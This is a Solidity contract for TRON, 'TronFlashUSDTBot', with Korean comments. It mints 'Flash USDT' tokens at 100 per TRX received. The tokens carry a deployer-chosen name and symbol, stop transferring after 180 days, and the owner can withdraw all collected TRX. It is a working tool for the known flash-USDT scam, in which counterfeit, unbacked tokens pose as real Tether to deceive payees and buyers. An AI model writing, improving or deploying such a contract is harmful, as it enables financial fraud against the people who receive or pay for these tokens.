// SPDX-License-Identifier: MIT
pragma solidity ^0.5.10;

contract TronFlashUSDTBot {
    string public name;
    string public symbol;
    uint8 public decimals = 6;
    uint256 public totalSupply;

    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public mintedAt;   // 발행 시각
    mapping(address => uint256) public duration;   // 유효 기간 (초)

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Flash(address indexed to, uint256 amount, uint256 expireAt);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(string memory _name, string memory _symbol) public {
        name = _name;
        symbol = _symbol;
        owner = msg.sender;
    }

    function() external payable {}

    // TRX를 받아 Flash USDT 발행 (1 TRX = 100 USDT, 유효기간 180일)
    function generateFlashUSDT() public payable {
        require(msg.value > 0, "Send TRX");
        uint256 usdtAmount = msg.value * 100; // 1 TRX = 100 USDT (decimals 6 기준)
        uint256 expireSec = 180 days;

        totalSupply += usdtAmount;
        balanceOf[msg.sender] += usdtAmount;
        mintedAt[msg.sender] = now;
        duration[msg.sender] = expireSec;

        emit Transfer(address(0), msg.sender, usdtAmount);
        emit Flash(msg.sender, usdtAmount, now + expireSec);
    }

    // 유효기간 확인
    function isExpired(address account) public view returns (bool) {
        if (mintedAt[account] == 0) return false;
        return now > mintedAt[account] + duration[account];
    }

    // 전송 (유효기간 내 토큰만)
    function transfer(address to, uint256 value) public returns (bool) {
        require(!isExpired(msg.sender), "Token expired");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        mintedAt[to] = mintedAt[msg.sender];
        duration[to] = duration[msg.sender];
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(!isExpired(from), "Token expired");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    // TRX 회수 (오너만)
    function withdrawal() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}